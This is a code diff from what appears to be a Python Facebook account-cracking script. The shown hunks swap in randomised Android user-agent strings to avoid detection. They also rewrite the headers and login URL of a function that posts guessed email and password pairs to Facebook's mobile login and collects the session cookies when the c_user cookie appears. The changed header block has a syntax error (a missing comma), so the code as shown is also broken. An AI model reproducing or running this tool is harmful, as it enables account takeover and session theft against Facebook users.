@@ -108,8 +108,8 @@ def follow(self, session, coki):
            
 #-----[UserAgent]-----#
 for xd in range(10000):
-    aa='Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
-    aa='Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
+    aa='Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
+    aa='Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
     b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
     c=' en-us; GT-'
     d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
@@ -244,25 +244,29 @@ def mumitx(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
-    'method':'POST',
-    'path':'/login/device-based/login/async/?refsrc=deprecated&lwv=100',
-    'scheme':'https',
-    'accept': '*/*',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://m.facebook.com',
-    'referer': 'https://m.facebook.com/',
-    'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'x-asbd-id': '198387',
-    'x-fb-lsd': 'AVoPmsopEAk',
-    'user-agent': pro}
-            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            header_freefb = {'authority': 'x.facebook.com',
+            'method': 'GET',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
+           'dpr': '2.4312500953674316',
+           'referer': 'https://x.facebook.com/',
+           'sec-ch-prefers-color-scheme': 'dark',
+           'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+           'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+           'sec-ch-ua-mobile': '?1',
+           'sec-ch-ua-model': '"M2101K7BI"',
+           'sec-ch-ua-platform': '"Android"',
+           'sec-ch-ua-platform-version': '"13.0.0"',
+           'sec-fetch-dest': 'document',
+           'sec-fetch-mode': 'navigate',
+           'sec-fetch-site': 'same-origin',
+           'sec-fetch-user': '?1',
+           'upgrade-insecure-requests': '1',
+           'user-agent': pro
+           'viewport-width': '980',}
+            lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
